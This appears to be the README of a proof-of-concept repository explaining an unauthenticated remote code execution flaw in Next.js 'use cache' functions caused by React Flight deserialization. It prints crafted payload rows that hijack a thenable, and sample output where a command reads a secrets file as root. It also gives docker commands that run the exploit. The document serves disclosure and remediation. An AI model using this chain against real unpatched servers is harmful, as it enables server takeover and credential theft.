# Case Study — GHSA-673q-mjm6-r5xr

### Unauthenticated Remote Code Execution in Next.js `use cache` functions returning typed arrays

| | |
|---|---|
| **Advisory** | [GHSA-673q-mjm6-r5xr](https://github.com/advisories/GHSA-673q-mjm6-r5xr) |
| **Upstream root cause** | React Server Components — [CVE-2026-126187 / GHSA-xqc2-xf4c-x3h3](https://github.com/advisories/GHSA-xqc2-xf4c-x3h3) |
| **Affected** | `next` `>=16.0.0 <16.4.1` (App Router + Cache Components) · `react-server-dom-{webpack,turbopack,parcel}` `<19.0.9 / <19.1.10 / <19.2.9 / <19.3.1` |
| **Fixed in** | Next.js **16.4.1** ([commit `a4cea6a`](https://github.com/vercel/next.js/commit/a4cea6a)) |
| **Class** | CWE-502, Deserialization of Untrusted Data |
| **Severity** | CVSS v4 **9.5 Critical** — `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H` |
| **Access required** | None (network, unauthenticated, no user interaction) |

This document explains the bug from first principles and walks through the exploit that the PoC in
this repository automates. Every claim below is backed by a runnable reproducer in
[`evidence/`](./evidence/) and by the real upstream patch diffs in
[`evidence/upstream-diffs/`](./evidence/upstream-diffs/).

---

## 1. Background: how `use cache` serializes data

Next.js App Router **Cache Components** (`use cache`) memoize the *return value* of a function.
To cache an arbitrary value — React elements, promises, `Map`s, typed arrays, blobs — Next uses the
**React Server Components "Flight" wire protocol**, the same serializer used for Server Actions and
RSC payloads.

In `dist/server/use-cache/use-cache-wrapper.js` (Next 16.4.0) the return value is **encoded**:

```js
// PRODUCER — "cache write"
stream = renderToReadableStream(resultPromise, clientReferenceManifest.clientModules, {
  environmentName: 'Cache', /* … */
});
const [returnStream, savedStream] = stream.tee();   // one copy stored by the cache handler
```

and later **decoded** back into live objects to render the page:

```js
// CONSUMER — "cache read"
return createFromReadableStream(stream, {
  serverConsumerManifest: {
    moduleLoading: null,
    moduleMap:       getRscModuleMappingForUseCache(),
    serverModuleMap: getServerModuleMap(),   // ← maps Server Reference ids → real functions
  },
  /* … */
});
```

Both halves run **inside the server process** while handling the request. That is the critical
property: if the decoder can be steered into invoking a function, the invocation is **server-side**
and happens on an **unauthenticated page render**.

The PoC's [`victim/server.js`](./victim/server.js) reproduces this exact pipeline
(`renderToReadableStream` → buffer the bytes → `createFromReadableStream`) using the real,
version-pinned `react-server-dom-webpack` package.

### Flight wire format, briefly

The Flight stream is a sequence of newline-delimited rows:

```
<idHex>:<tag><payload>
```

A few tags matter here:

| Tag | Meaning |
|-----|---------|
| `o` | `Uint8Array` typed array: `<id>:o<lengthHex>,<raw bytes>` |
| `T` | outlined raw text (long strings): `<id>:T<lengthHex>,<raw bytes>` |
| `h` | **Server Reference**: resolves `{ "id": "<module#export>", "bound": … }` to a callable |
| `0:{…}` | the root model; `"$N"` means "the value of row N" |

Typed arrays **larger than 4096 bytes** are not copied inline — they are emitted *by reference*,
streamed straight into the byte `ReadableStream`. That optimization is where the bug lives.

---

## 2. Root cause #1 — the encoder desync (a length/payload mismatch)

### The WHATWG detail that breaks everything

A byte-oriented `ReadableStream` (`new ReadableStream({ type: 'bytes' })`) **transfers** (detaches)
the `ArrayBuffer` of any view you `enqueue()`. After the transfer, *every* view onto that buffer —
including other views the program still holds — reports `byteLength === 0`:

```
evidence: 00-arraybuffer-detach.mjs
before enqueue: buf.detached = false | v1.byteLength = 8192 | v2.byteLength = 8192
after  enqueue: buf.detached = true  | v1.byteLength = 0    | v2.byteLength = 0
```

### What the vulnerable encoder does

`emitTypedArrayChunk` (in `react-server-dom-webpack-server.node`) writes, for each typed array:

1. a header `"<id>:o<byteLength in hex>,"` computed from the view's length **now**, then
2. the raw bytes, by enqueuing the view into the byte stream.

When a `use cache` value contains **two typed arrays that are views onto the same `ArrayBuffer`**,
the sequence is:

1. emit header for view 1 (`2000` = 8192) ✔, enqueue view 1 → **buffer detaches**;
2. emit header for view 2 — but `byteLength` is read *before* the fix only to build the header…
   actually the header for view 2 was computed from its length, which is now **0**, *or* the bytes
   written are 0 while the header still said 8192, depending on ordering — either way the **declared
   length and the bytes actually written disagree**.

The reproducer shows the real, observed outcome — view 2's header says `o2000` (8192) but **zero
bytes follow** it:

```
evidence: 01-encoder-desync.cjs  (react-server-dom-webpack@19.2.8)
  stream bytes: 8321  | expected >= 2 x 8192 = 16384
  0x41 ("A") count: 8196     ← view 1 present
  0x42 ("B") count: 0        ← view 2 entirely missing
  1:o2000,<8192xA>2:o2000,0:{"one":"$1","two":"$2","note":"ATTACKER_CONTROLLED_VALUE…"}
                         ▲ header declares 8192 bytes, but the next thing on the wire is row 0
```

The **patched** encoder (`19.2.9`) detects the detached/aliased buffer and copies the view into a
fresh buffer (`view.slice()`) before emitting, so both arrays survive:

```
evidence: 01-encoder-desync.cjs  (react-server-dom-webpack@19.2.9)
  stream bytes: 16513
  0x42 ("B") count: 8192     ← view 2 now intact
  1:o2000,<8192xA>2:o2000,<8192xB>0:{"one":"$1","two":"$2","note":"ATTACKER_CONTROLLED_VALUE…"}
```

> **See the real fix:** [`evidence/upstream-diffs/server-encoder.next-16.4.0-to-16.4.1.diff`](./evidence/upstream-diffs/server-encoder.next-16.4.0-to-16.4.1.diff)
> — note the new `supportsArrayBufferDetached` guard, the `"Cannot transport a detached buffer"`
> error, and `typedArray = view.slice()` in `emitTypedArrayChunk`.

### Why a desync is dangerous

The decoder trusts the declared length. Reading row 2 it will consume **8192 bytes** from the
stream regardless of how many were really written — so it **swallows whatever bytes follow**
(stream framing, the next row's header, and the start of the attacker's string), and then resumes
parsing at an attacker-chosen offset. The attacker controls a value that appears *after* the typed
arrays (`note` / `displayName`), so **the attacker's bytes become the bytes the decoder reads as
protocol**.

---

## 3. Root cause #2 — the decoder sink (type confusion → call)

Injecting raw rows is only useful if some row makes the decoder *do* something dangerous. It does.

### A thenable whose `.then` is a function the attacker chose

React's decoder resolves a Server Reference with tag `h`:

```js
case "h":
  return getOutlinedModel(response, value.slice(2), parentObject, key, loadServerReference);
```

`loadServerReference` (vulnerable version) has **no guards**:

```js
function loadServerReference(response, metaData, parentObject, key) {
  // (no checks on `key` or on typeof metaData.id)
  var serverReference = resolveServerReference(response._serverReferenceConfig, metaData.id),
      promise = /* … */ requireModule(serverReference);   // __webpack_require__(id)[name]
  // parentObject[key] = <the resolved function>
}
```

So a row like `{"then": "$h9"}`, where row 9 is `{"id":"<module#export>","bound":null}`, produces
an object `{ then: <the resolved server function> }`. **That object is now a thenable.** When React
(or the awaiting caller) coerces it — `Promise.resolve(obj)` / `await obj` — JavaScript calls
`obj.then(resolve, reject)`, i.e. it **calls the attacker's function**.

The isolated reproducer proves the sink, vulnerable vs patched:

```
evidence: 02-type-confusion-sink.cjs
  payload:  1:{"id":"gadget-module-id#run","bound":null}
            0:{"then":"$h1"}

  [VULN  19.2.8]  *** GADGET run() CALLED ***        ← the attacker's function runs
  [FIXED 19.2.9]  resolved root = { then: null }     ← neutralized
```

### What the fix adds

[`evidence/upstream-diffs/client-decoder.next-16.4.0-to-16.4.1.diff`](./evidence/upstream-diffs/client-decoder.next-16.4.0-to-16.4.1.diff)
shows the three defensive changes:

```js
// 1. loadServerReference: refuse to resolve a server reference into a `then` slot,
//    and refuse a non-string id (blocks turning `then` into a callable & id confusion)
function loadServerReference(response, metaData, parentObject, key) {
  if ("then" === key) return null;
  var id = metaData.id;
  if ("string" !== typeof id) return null;
  …
}

// 2. createModel: null out a function parked under a `then` key
function createModel(response, model, parentObject, key) {
  return "then" === key && "function" === typeof model ? null : model;
}

// 3. RESPONSE_SYMBOL: the real Response is stored behind a Symbol so an attacker-crafted
//    plain object from the stream can no longer masquerade as the decoder's `response`
//    (which would hand over `_bundlerConfig` / `_serverReferenceConfig` → arbitrary modules).
```

Any one of these breaks the chain; together they fully close it.

---

## 4. Putting it together — the full chain

Combining §2 and §3 in a single process (exactly the `use cache` encode→decode boundary):

```
evidence: 03-full-chain-rce.cjs   (react-server-dom-webpack@19.2.8)

  --- corrupted Flight wire (binary runs collapsed) ---
  1:o2000,<8192xA>2:o2000,3:T2036,<8184xP>9:{"id":"gadget-module-id#pwn","bound":null}
  0:{"then":"$h9"}
  0:{"one":"$1","two":"$2","note":"$3"}

  --- consumer decode (in the server process) ---
  *** GADGET pwn() EXECUTED -> `id` = uid=0(root) gid=0(root) groups=0(root)
```

Reading the corrupted wire:

- `1:o2000,<8192xA>` — view 1 (avatar), fine.
- `2:o2000,` — view 2 (thumbnail): header declares `0x2000` = 8192 bytes, **but zero bytes follow**.
- The decoder, satisfying row 2's 8192-byte quota, **swallows** `3:T2036,` (row 3's header) plus the
  first 8184 bytes of the attacker's string (`<8184xP>`) — 8 + 8184 = 8192 bytes exactly.
- Parsing resumes at the attacker's injected rows:
  - `9:{"id":"…#pwn","bound":null}` — a Server Reference the attacker defined;
  - `0:{"then":"$h9"}` — the root is now a thenable whose `.then` is that reference.
- React coerces the root thenable → calls the reference → **code execution**.

The attacker computes the padding so the row-2 swallow ends *exactly* where the injected rows begin.
This "self-alignment" is a tiny fixed-point loop (the only unknown is the hex length of row 3's
header); see `buildMaliciousDisplayName` in [`poc/exploit.js`](./poc/exploit.js).

On the **patched** build the same input is inert — the encoder copies view 2, there is no desync,
and the attacker's bytes remain a harmless `note` string:

```
evidence: 03-full-chain-rce.cjs   (react-server-dom-webpack@19.2.9)
  1:o2000,<8192xA>2:o2000,<8192xB>3:T2036,<8184xP>9:{…}  ← both arrays intact; "9:{…}" is just text
  decoded root = { one: Uint8Array(8192)…, two: Uint8Array(8192)…, note: 'PPPP…9:{"id":…' }
```

---

## 5. The remote exploit (what the Docker PoC does)

`victim/server.js` exposes `POST /profile`, whose body becomes the attacker-controlled display name
fed to the `use cache` function `getProfileCard(displayName)` (two shared-buffer typed arrays +
`displayName`). A remote, unauthenticated attacker:

1. `POST /profile` with a body of `P`×padding + the two injected Flight rows, where the injected
   Server Reference id is `rce:<base64(command)>`.
2. The victim encodes the cached value, stores the bytes, and decodes them — the desync fires, the
   reference is injected, React coerces the hijacked root, and the victim's module runtime resolves
   `rce:<base64(cmd)>` to a function that runs `cmd` via `/bin/sh`.
3. `GET /proof` returns the command's output.

```
[+] REMOTE CODE EXECUTION CONFIRMED
    command : id; echo; echo "=== exfiltrated /app/SECRET.txt ==="; cat /app/SECRET.txt; echo; uname -a
    host    : 648b3c59052e   user: root   pid: 1
    | uid=0(root) gid=0(root) groups=0(root)
    | === exfiltrated /app/SECRET.txt ===
    | DB_PASSWORD=hunter2
    | API_KEY=sk-live-7f3c9a21b0e4
    | FLAG{GHSA-673q-mjm6-r5xr-rce}
    | Linux 648b3c59052e … aarch64 GNU/Linux
```

### On the "gadget" and fidelity to a real target

In this PoC the injected Server Reference id resolves to a command-executing module
(`rce:<base64>` in [`victim/app-modules.js`](./victim/app-modules.js)). It stands in for **the class
of dangerous functions that exist in any real server module graph** — a Server Action that touches
the filesystem, spawns a process, builds a query, or deserializes input. The security boundary that
is broken is identical regardless of the specific sink: *untrusted Flight bytes must never be able to
choose which server function runs, nor confuse a value into a callable.* That the real fix adds a
`typeof id !== "string"` check confirms the Server Reference `id` is attacker-influenced in exactly
this way.

A real-world attacker does not need a convenient `rce:` module: the generic primitive is "invoke an
arbitrary export of an arbitrary entry in the app's own server/client module map, as a thenable
`.then`, during an unauthenticated render." Next's own advisory rates the result RCE (CVSS 9.5).

### The DoS facet

Note that the shared-buffer shape corrupts the cache entry for *every* read, not just malicious ones:
a short, benign `displayName` can't satisfy row 2's phantom 8192-byte quota, so the decode hangs
(`Connection closed` / timeout). The same root cause is therefore also an availability bug for any
app that happens to produce this value shape — which is why the advisory urges upgrading even if you
believe you have no such `use cache` function.

---

## 6. Affected code map (Next.js 16.4.0, vendored React Flight)

The App Router runtime bundles the **experimental** Flight builds, which were verified to carry the
identical bug and identical fix:

| Bundle (Next 16.4.0 `dist/compiled/…`) | vulnerable marker | fixed marker (16.4.1) |
|---|---|---|
| `react-server-dom-webpack/…-server.node.development.js` | no `buffer.detached` guard in `emitTypedArrayChunk` | adds `supportsArrayBufferDetached` + `view.slice()` |
| `react-server-dom-webpack/…-client.node.development.js` | `loadServerReference` has no `"then"`/`typeof id` guard; `createModel` returns `model` unchanged | adds `if ("then" === key) return null`, `createModel` nulls function-`then`, `RESPONSE_SYMBOL` |
| `react-server-dom-webpack-experimental/…` (used by App Router) | **same vulnerable markers** | **same fix** |
| `react-server-dom-turbopack{,-experimental}/…` | same | same |

The commit `a4cea6a` swaps all four `react-server-dom-*` families from registry versions to the
patched local builds.

---

## 7. Remediation

- **Upgrade Next.js to ≥ 16.4.1.** This is the only fix; there is no configuration or code
  workaround for an affected `use cache` function.
- If you consume `react-server-dom-{webpack,turbopack,parcel}` directly, upgrade to
  `19.0.9` / `19.1.10` / `19.2.9` / `19.3.1` or later.
- Defense in depth (does **not** replace the upgrade): avoid returning multiple typed arrays that
  alias one `ArrayBuffer` from cached/serialized functions; `.slice()` views to give each its own
  buffer before returning them across a Flight boundary.

---

## 8. Reproduce it yourself

```bash
# the three root-cause reproducers, vulnerable vs patched, hermetic:
docker compose run --rm evidence

# the remote exploit, end to end:
docker compose up -d --build victim victim-patched
docker compose run --rm poc            # RCE
docker compose run --rm poc-patched    # safe
```

Reference captures: [`evidence/sample-run.txt`](./evidence/sample-run.txt) and the upstream patch
diffs under [`evidence/upstream-diffs/`](./evidence/upstream-diffs/).
